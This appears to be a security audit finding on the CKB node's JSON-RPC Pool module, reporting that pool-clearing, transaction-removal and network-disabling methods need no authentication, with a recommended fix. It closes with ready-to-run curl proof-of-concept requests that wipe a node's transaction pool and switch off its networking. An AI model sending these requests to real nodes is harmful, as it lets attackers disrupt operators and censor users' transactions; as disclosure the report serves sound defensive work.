### Title
Any RPC Caller Can Clear or Remove All Transactions from the Transaction Pool Without Authorization — (`rpc/src/module/pool.rs`)

### Summary

The CKB JSON-RPC `Pool` module exposes `clear_tx_pool`, `remove_transaction`, and `clear_tx_verify_queue` as unauthenticated, publicly callable endpoints with no caller identity check or access control guard. Any process or network client that can reach the RPC port can invoke these functions to wipe the entire pending transaction pool, remove targeted transactions and all their descendants, or flush the verification queue — with no credentials required. This is a direct structural analog to the `DcntEth::setRouter()` missing-access-control pattern: a privileged state-mutating function is callable by any unprivileged actor.

### Finding Description

**Root cause — no authentication or authorization on privileged pool management RPCs**

The `PoolRpc` trait declares three destructive pool-management methods:

```rust
// rpc/src/module/pool.rs
#[rpc(name = "clear_tx_pool")]
fn clear_tx_pool(&self) -> Result<()>;

#[rpc(name = "remove_transaction")]
fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;

#[rpc(name = "clear_tx_verify_queue")]
fn clear_tx_verify_queue(&self) -> Result<()>;
```

Their implementations perform the privileged action immediately with no caller check:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}

fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}

fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_verify_queue()
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

The RPC server itself has no authentication layer. The `RpcServer` wires all registered methods directly into an Axum router with a permissive CORS policy and no token/session validation:

```rust
// rpc/src/server.rs
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← no auth
    ...
```

**Exploit path**

1. Attacker identifies a CKB node with the `Pool` RPC module enabled (default configuration includes it).
2. Attacker sends a single unauthenticated HTTP POST to the RPC port:
   ```json
   {"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}
   ```
3. The entire pending and proposed transaction pool is wiped. All in-flight transactions — including high-fee transactions waiting to be mined — are discarded.
4. Attacker can repeat this in a loop to prevent any transaction from ever being mined on that node.
5. Alternatively, attacker calls `remove_transaction` with a targeted tx hash to silently drop a specific user's transaction and all its descendants.

The `Net` module exposes an equally unguarded `set_network_active(false)` that any RPC caller can use to completely disable P2P networking on the node, compounding the DoS.

### Impact Explanation

- **Transaction pool DoS**: `clear_tx_pool` atomically discards every pending and proposed transaction. Users who submitted transactions lose them silently; miners lose all queued fee revenue. The attacker can sustain this indefinitely with a trivial HTTP loop.
- **Targeted transaction removal**: `remove_transaction` lets an attacker surgically evict any specific transaction and its entire descendant chain from the pool, enabling griefing of individual users or censorship of specific transactions.
- **Verification queue flush**: `clear_tx_verify_queue` discards all transactions currently being script-verified, stalling the node's ability to accept new transactions until the queue refills.
- **Network isolation**: `set_network_active(false)` severs all P2P connections, preventing the node from receiving new blocks or relaying transactions.

All of these are permanent until the node operator manually intervenes or restarts the node.

### Likelihood Explanation

The RPC default bind address is `127.0.0.1:8114`, which limits exposure to localhost. However:
- Any local process (malicious script, compromised dependency, browser-based SSRF via `localhost`) can reach it without credentials.
- Operators frequently expose the RPC to LAN or internet for wallet/dApp integration; the documentation warns against this but does not enforce it.
- The `Pool` module is enabled by default in the production configuration.
- The attack requires a single HTTP request with no prior knowledge beyond the port number.

The scope explicitly lists "RPC caller" as a valid unprivileged attacker profile.

### Recommendation

Add an application-level authentication mechanism to the RPC server (e.g., a configurable bearer token or IP allowlist enforced in middleware), and gate all state-mutating Pool and Net methods behind it. At minimum, `clear_tx_pool`, `remove_transaction`, `clear_tx_verify_queue`, and `set_network_active` should require explicit operator authorization rather than relying solely on network-level access control that operators routinely misconfigure.

### Proof of Concept

```bash
# Wipe the entire transaction pool on a default-configured CKB node
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"id":1,"jsonrpc":"2.0","result":null}

# Confirm pool is empty
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# Returns pending:0, proposed:0

# Disable all P2P networking
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"set_network_active","params":[false]}'
```

No credentials, no signatures, no prior state required.
